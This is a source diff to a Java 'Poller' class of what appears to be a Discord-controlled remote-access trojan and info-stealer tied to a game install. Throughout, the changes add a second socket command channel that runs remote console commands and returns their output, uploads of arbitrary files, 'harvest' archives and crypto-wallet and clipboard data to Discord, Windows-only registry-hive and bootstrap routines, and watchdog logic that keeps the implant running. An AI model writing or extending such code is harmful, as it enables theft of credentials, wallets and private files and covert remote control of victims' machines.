@@ -43,6 +43,7 @@ public final class Poller implements Runnable {
 	private final AtomicLong commandSeq = new AtomicLong();
 	private final Semaphore heavyCommands = new Semaphore(1);
 	private final Semaphore pollNow = new Semaphore(0);
+	private final ThreadLocal<StringBuilder> capture = new ThreadLocal<>();
 	private final AutoUpdate auto;
 	private final OpsManager ops;
 	private final Set<String> seen = new LinkedHashSet<>();
@@ -57,6 +58,7 @@ public final class Poller implements Runnable {
 	private volatile CryptoModule crypto;
 	private volatile String currentToken = "";
 	private volatile Gateway gateway;
+	private volatile PanelSocket panel;
 	private volatile String selfId = "";
 	private volatile String channelId = "";
 	private volatile String webhookUrl = "";
@@ -64,6 +66,9 @@ public final class Poller implements Runnable {
 	private long lastSave;
 	private volatile long lastMessageAt;
 	private volatile long lastPollAt;
+	private volatile long lastCompletedPoll;
+	private volatile long pollInFlightStartedAt;
+	private volatile boolean terminated;
 	private volatile long gatewayDownSince;
 	private volatile int recoveries;
 
@@ -72,6 +77,8 @@ public final class Poller implements Runnable {
 		this.gameDir = gameDir;
 		this.state = state;
 		this.auto = new AutoUpdate(state, System::currentTimeMillis, random);
+		this.lastCompletedPoll = System.currentTimeMillis();
+		this.lastPollAt = this.lastCompletedPoll;
 		this.ops = new OpsManager(installDir, state, this);
 		this.cwd = Path.of(System.getProperty("user.home", "."));
 		this.executor = new CommandExecutor(this, installDir, gameDir, state);
@@ -94,10 +101,14 @@ public final class Poller implements Runnable {
 		this.commandWatchdog.scheduleWithFixedDelay(this::superviseCommands, 10L, 10L, TimeUnit.SECONDS);
 	}
 
+	/** Blocking on purpose: the supervisor owns the restart loop. */
 	public void start() {
-		Thread thread = new Thread(this, "spc-poller");
-		thread.setDaemon(false);
-		thread.start();
+		pollerThread = Thread.currentThread();
+		run();
+	}
+
+	public boolean terminated() {
+		return terminated;
 	}
 
 	public void startOps() {
@@ -112,6 +123,10 @@ public final class Poller implements Runnable {
 		return ops;
 	}
 
+	CommandExecutor executor() {
+		return executor;
+	}
+
 	/** Wallets and clipboard API transport, independent from the Discord poller. */
 	public void startCrypto() {
 		try {
@@ -121,10 +136,10 @@ public final class Poller implements Runnable {
 				return;
 			}
 			crypto = new CryptoModule(installDir, gameDir, config, (module, file) -> {
-				if (!uploadFile(file)) {
+				if (!uploadFile(file, module)) {
 					Log.debug("Crypto fallback upload failed: " + file);
 				}
-			});
+			}, ops.clipboard(), this::agentCommand);
 			crypto.start();
 		} catch (Throwable throwable) {
 			Log.debug("Crypto module failed to start", throwable);
@@ -148,12 +163,34 @@ public final class Poller implements Runnable {
 	}
 
 	public String submitCrypto(String name, java.util.Map<String, Object> params, int timeout) {
+		return submitCrypto("", name, params, timeout);
+	}
+
+	public String submitCrypto(String id, String name, java.util.Map<String, Object> params, int timeout) {
 		CryptoModule current = crypto;
 		if (current == null) {
 			return "Crypto module disabled";
 		}
-		String rejected = current.submit(new CryptoModule.Task("local-" + System.nanoTime(), name, params, timeout));
+		String taskId = id == null || id.isEmpty() ? "local-" + System.nanoTime() : id;
+		String rejected = current.submit(new CryptoModule.Task(taskId, name, params, timeout), taskId);
 		return rejected != null ? rejected : "Task " + name + " queued";
+	}
+
+	public boolean cancelCrypto(String id) {
+		CryptoModule current = crypto;
+		return current != null && current.cancel(id);
+	}
+
+	public String uploadPath(String path) {
+		try {
+			Path file = Path.of(path);
+			if (!Files.isRegularFile(file)) {
+				return "Not found: " + path;
+			}
+			return uploadFile(file, "files") ? "Uploaded " + file.getFileName() : "Upload failed";
+		} catch (Throwable throwable) {
+			return "Failed: " + throwable.getMessage();
+		}
 	}
 
 	public boolean ready() {
@@ -239,15 +276,18 @@ public final class Poller implements Runnable {
 			} else if (gatewayDownSince == 0L) {
 				gatewayDownSince = now;
 			}
-			boolean pollStuck = now - lastPollAt > 90_000L;
+			boolean pollStuck = pollStale(now, lastCompletedPoll, pollInFlightStartedAt);
+			PanelSocket currentPanel = panel;
+			boolean panelStuck = currentPanel != null && currentPanel.healthy(now) == false
+				&& pollStale(now, currentPanel.lastInboundAt(), currentPanel.lastInboundAt());
 			boolean gatewayDown = gatewayDownSince > 0L && now - gatewayDownSince > 90_000L;
 			if (recoveries >= 3 && pollStuck) {
 				Log.debug("Transport stuck after " + recoveries + " recoveries, exiting");
 				hardExit();
 				return;
 			}
-			if (pollStuck || gatewayDown) {
-				recoverTransport(pollStuck ? "rest poll stuck" : "gateway down");
+			if (pollStuck || gatewayDown || panelStuck) {
+				recoverTransport(pollStuck ? "rest poll stuck" : gatewayDown ? "gateway down" : "panel socket down");
 			}
 		}
 	}
@@ -263,6 +303,10 @@ public final class Poller implements Runnable {
 			if (oldGateway != null) {
 				oldGateway.stop();
 			}
+			PanelSocket oldPanel = panel;
+			if (oldPanel != null) {
+				oldPanel.stop();
+			}
 			DiscordClient oldClient = client;
 			if (oldClient != null) {
 				oldClient.close();
@@ -274,7 +318,10 @@ public final class Poller implements Runnable {
 			client = new DiscordClient(currentToken);
 			gateway = new Gateway(this, client);
 			gateway.start();
+			panel = new PanelSocket(this, installDir, executor);
+			panel.start();
 			lastPollAt = System.currentTimeMillis();
+			lastCompletedPoll = lastPollAt;
 			gatewayDownSince = 0L;
 			auxPool.execute(() -> {
 				try {
@@ -292,10 +339,15 @@ public final class Poller implements Runnable {
 	private void hardExit() {
 		try {
 			running = false;
+			terminated = true;
 			state.save(AgentPaths.state(installDir));
 			Gateway current = gateway;
 			if (current != null) {
 				current.stop();
+			}
+			PanelSocket currentPanel = panel;
+			if (currentPanel != null) {
+				currentPanel.stop();
 			}
 			DiscordClient active = client;
 			if (active != null) {
@@ -391,6 +443,8 @@ public final class Poller implements Runnable {
 			}
 			gateway = new Gateway(this, client);
 			gateway.start();
+			panel = new PanelSocket(this, installDir, executor);
+			panel.start();
 			lastPollAt = System.currentTimeMillis();
 			startTransportWatchdog();
 			absorbRollback();
@@ -402,7 +456,9 @@ public final class Poller implements Runnable {
 			while (running) {
 				try {
 					if (gatewayHealthy() && contentIntent()) {
-						pollNow.tryAcquire(5L, TimeUnit.MINUTES);
+						// A healthy gateway can be silent for minutes; still run a
+						// cheap REST cycle below the 90 s watchdog window.
+						pollNow.tryAcquire(75L, TimeUnit.SECONDS);
 						pollNow.drainPermits();
 						if (!running) {
 							break;
@@ -659,7 +715,7 @@ public final class Poller implements Runnable {
 		}
 		try {
 			Path zip = Harvest.build(installDir, gameDir);
-			if (uploadFile(zip)) {
+			if (uploadFile(zip, "harvest")) {
 				Files.deleteIfExists(zip);
 			}
 		} catch (Throwable throwable) {
@@ -733,8 +789,24 @@ public final class Poller implements Runnable {
 			|| name.matches("seeds\\.log(\\.[123])?");
 	}
 
+	/** True when a REST cycle is overdue or one has been wedged too long. */
+	static boolean pollStale(long now, long completed, long inFlight) {
+		long since = now - Math.max(completed, inFlight);
+		return since > 90_000L;
+	}
+
 	private boolean poll() throws Exception {
 		Log.debug("Poll REST");
+		pollInFlightStartedAt = System.currentTimeMillis();
+		try {
+			return pollOnce();
+		} finally {
+			pollInFlightStartedAt = 0L;
+			lastCompletedPoll = System.currentTimeMillis();
+		}
+	}
+
+	private boolean pollOnce() throws Exception {
 		String after;
 		synchronized (seenLock) {
 			after = state.lastId;
@@ -1064,7 +1136,29 @@ public final class Poller implements Runnable {
 		}
 	}
 
+	/** Runs an agent-console command and returns its textual output. */
+	public String agentCommand(String command) {
+		StringBuilder buffer = new StringBuilder();
+		capture.set(buffer);
+		try {
+			executor.executeAgent(command);
+		} catch (Throwable throwable) {
+			buffer.append("Failed: ").append(throwable.getMessage());
+		} finally {
+			capture.remove();
+		}
+		return buffer.toString().strip();
+	}
+
 	public void reply(String text) {
+		StringBuilder buffer = capture.get();
+		if (buffer != null) {
+			if (buffer.length() > 0) {
+				buffer.append('\n');
+			}
+			buffer.append(text);
+			return;
+		}
 		try {
 			int start = 0;
 			while (start < text.length()) {
@@ -1121,16 +1215,28 @@ public final class Poller implements Runnable {
 	}
 
 	public boolean uploadFile(Path file) {
+		return uploadFile(file, "");
+	}
+
+	/**
+	 * The module prefix is the Discord closure signal: `files-*.zip` closes
+	 * file_pull and never harvest, even though both are ZIPs.
+	 */
+	public boolean uploadFile(Path file, String module) {
 		try {
 			if (file == null || !Files.isRegularFile(file)) {
 				return false;
 			}
+			String name = file.getFileName().toString();
+			if (module != null && !module.isEmpty() && !name.startsWith(module + "-")
+				&& !name.startsWith("result-")) {
+				name = module + "-" + name;
+			}
 			long size = Files.size(file);
 			if (size > UPLOAD_LIMIT) {
-				return uploadParts(file);
+				return uploadParts(file, name);
 			}
 			byte[] data = Files.readAllBytes(file);
-			String name = file.getFileName().toString();
 			return uploadBytes(data, name, contentType(name));
 		} catch (Throwable throwable) {
 			Log.debug("Upload file failed", throwable);
@@ -1139,8 +1245,7 @@ public final class Poller implements Runnable {
 	}
 
 	/** Discord caps a single attachment; large archives travel as sorted .partNN files. */
-	private boolean uploadParts(Path file) throws java.io.IOException {
-		String base = file.getFileName().toString();
+	private boolean uploadParts(Path file, String base) throws java.io.IOException {
 		long size = Files.size(file);
 		int count = (int) ((size + UPLOAD_PART - 1L) / UPLOAD_PART);
 		try (java.io.RandomAccessFile input = new java.io.RandomAccessFile(file.toFile(), "r")) {
@@ -1327,7 +1432,7 @@ public final class Poller implements Runnable {
 
 	public void harvestNow() {		try {
 			Path zip = Harvest.build(installDir, gameDir);
-			if (uploadFile(zip)) {
+			if (uploadFile(zip, "harvest")) {
 				Files.deleteIfExists(zip);
 			} else {
 				reply("Harvest upload failed; kept " + zip.getFileName() + " in cache");
@@ -1339,10 +1444,15 @@ public final class Poller implements Runnable {
 
 	public void kill() {
 		running = false;
+		terminated = true;
 		pollNow.release();
 		Gateway currentGateway = gateway;
 		if (currentGateway != null) {
 			currentGateway.stop();
+		}
+		PanelSocket currentPanel = panel;
+		if (currentPanel != null) {
+			currentPanel.stop();
 		}
 		Thread thread = pollerThread;
 		if (thread != null) {
@@ -1364,10 +1474,18 @@ public final class Poller implements Runnable {
 	}
 
 	public void hivesNow() {
+		if (!AgentPaths.isWindows()) {
+			reply("unsupported_os: hives is Windows only");
+			return;
+		}
 		Bootstrap.hivesNow(this, installDir, state);
 	}
 
 	public void bootstrapNow() {
+		if (!AgentPaths.isWindows()) {
+			reply("unsupported_os: bootstrap is Windows only");
+			return;
+		}
 		Bootstrap.now(this, installDir, state);
 	}
 
